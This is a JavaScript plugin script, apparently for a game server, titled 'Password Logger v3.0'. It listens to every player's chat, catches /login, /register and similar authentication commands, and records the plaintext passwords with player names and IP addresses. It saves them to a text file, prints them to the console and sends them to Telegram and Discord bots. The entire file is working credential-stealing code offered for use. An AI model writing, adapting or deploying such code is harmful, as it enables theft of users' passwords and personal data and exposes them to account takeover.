/**
 * Password Logger v3.0
 * Captures login/register commands with bot integration
 * 
 * FEATURES:
 * - Customizable command list
 * - Save to file option
 * - Telegram/Discord notifications via Integrations
 */

// ============================================
// GENERAL SETTINGS
// ============================================
const SAVE_TO_FILE = true; // Save passwords to txt file
const LOG_FILE = "passwords.txt"; // File name
const NOTIFY_CONSOLE = true; // Show in console

// Commands to monitor (comma-separated)
const LOGIN_COMMANDS = "/login,/l,/log"; // Login
const REGISTER_COMMANDS = "/register,/reg,/r"; // Register  
const CUSTOM_COMMANDS = "/auth,/pass,/password,/nlogin,/nreg"; // Other
// ============================================

// Load integrations helper
let integrations = null;
try {
    integrations = require('./integrations-helper');
} catch (e) {
    console.log('[PasswordLogger] Integrations helper not found, notifications disabled');
}

// Parse commands
const allCommands = [...LOGIN_COMMANDS.split(','), ...REGISTER_COMMANDS.split(','), ...CUSTOM_COMMANDS.split(',')]
    .map(cmd => cmd.trim().toLowerCase())
    .filter(cmd => cmd.length > 0);

let fs = null;
try { fs = require('fs'); } catch (e) { }

function saveToFile(data) {
    if (!SAVE_TO_FILE || !fs) return;
    try {
        const timestamp = new Date().toISOString();
        const line = `[${timestamp}] ${data.player} | ${data.ip} | ${data.command}\n`;
        fs.appendFileSync(LOG_FILE, line);
    } catch (e) { }
}

async function logPassword(player, command) {
    const timestamp = new Date().toLocaleString();

    // Console notification
    if (NOTIFY_CONSOLE) {
        console.log("");
        console.log("╔══════════════════════════════════════╗");
        console.log("║       🔑 PASSWORD CAPTURED!          ║");
        console.log("╠══════════════════════════════════════╣");
        console.log("║ Player: " + player.name.padEnd(28) + "║");
        console.log("║ IP: " + player.ip.padEnd(32) + "║");
        console.log("║ Command: " + command.substring(0, 27).padEnd(27) + "║");
        console.log("║ Time: " + timestamp.padEnd(30) + "║");
        console.log("╚══════════════════════════════════════╝");
        console.log("");
    }

    // Save to file
    if (SAVE_TO_FILE) {
        saveToFile({ player: player.name, ip: player.ip, command: command });
    }

    // Send to bots via integrations
    if (integrations) {
        const tgMessage = `🔑 <b>PASSWORD CAPTURED!</b>\n\n👤 Player: <b>${player.name}</b>\n📍 IP: <code>${player.ip}</code>\n💬 Command: <code>${command}</code>\n⏰ Time: ${timestamp}`;

        const dcOptions = {
            title: '🔑 Password Captured!',
            color: 0xffff00,
            fields: [
                { name: 'Player', value: player.name, inline: true },
                { name: 'IP', value: `\`${player.ip}\``, inline: true },
                { name: 'Command', value: `\`\`\`${command}\`\`\``, inline: false }
            ]
        };

        integrations.notify(tgMessage, 'password_logger', 'passwordCapture', dcOptions);
    }
}

playerJoin(player => {
    console.log("[PasswordLogger] Monitoring: " + player.name);

    // Notify player join if enabled
    if (integrations) {
        const joinMsg = `🟢 <b>${player.name}</b> connected\n📍 IP: <code>${player.ip}</code>`;
        integrations.notify(joinMsg, 'password_logger', 'playerJoin', {
            title: '🟢 Player Connected',
            color: 0x00ff00
        });
    }

    player.on("player_message", event => {
        const text = event.text.toLowerCase();

        for (const cmd of allCommands) {
            if (text.startsWith(cmd + " ") || text === cmd) {
                logPassword(player, event.text);
                break;
            }
        }
    });

    player.on("leave", () => {
        if (integrations) {
            const leaveMsg = `🔴 <b>${player.name}</b> disconnected`;
            integrations.notify(leaveMsg, 'password_logger', 'playerLeave', {
                title: '🔴 Player Disconnected',
                color: 0xff0000
            });
        }
    });
});

console.log("✅ Password Logger v3.0 loaded!");
console.log("   Commands: " + allCommands.join(", "));
console.log("   File logging: " + (SAVE_TO_FILE ? LOG_FILE : "Disabled"));
console.log("   Bot integration: " + (integrations ? "Available" : "Not configured"));
